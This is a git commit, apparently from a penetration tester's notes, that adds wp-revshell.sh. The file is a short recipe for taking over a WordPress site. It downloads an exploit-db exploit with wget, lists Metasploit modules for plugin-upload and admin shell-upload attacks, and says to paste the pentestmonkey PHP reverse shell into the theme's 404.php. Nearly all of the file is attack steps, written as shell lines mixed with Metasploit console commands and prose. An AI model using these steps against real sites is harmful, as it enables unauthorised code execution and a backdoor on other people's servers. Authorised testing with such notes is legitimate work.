ee51d153aaf6d16939712f607e419ae03ee91e56
Jackmeister <78603128+J4CKMEISTER@users.noreply.github.com>
2023-02-16 17:19:51 +0800

    Create wp-revshell.sh

---
+++ wp-revshell.sh
@@ -0,0 +1,16 @@
+#!/bin/bash
+
+#Plugin Upload
+wget https://www.exploit-db.com/raw/36374
+use exploit/unix/webapp/wp_slideshowgallery_upload
+use exploit/unix/webapp/wp_reflexgallery_file_upload
+
+
+#Appereance > Theme Editor >  404.php or any php file
+https://www.revshells.com/
+select second phppentestmonkey
+paste the code at 404.php
+
+#Metasploit exploit
+use exploit/unix/webapp/wp_admin_shell_upload
+
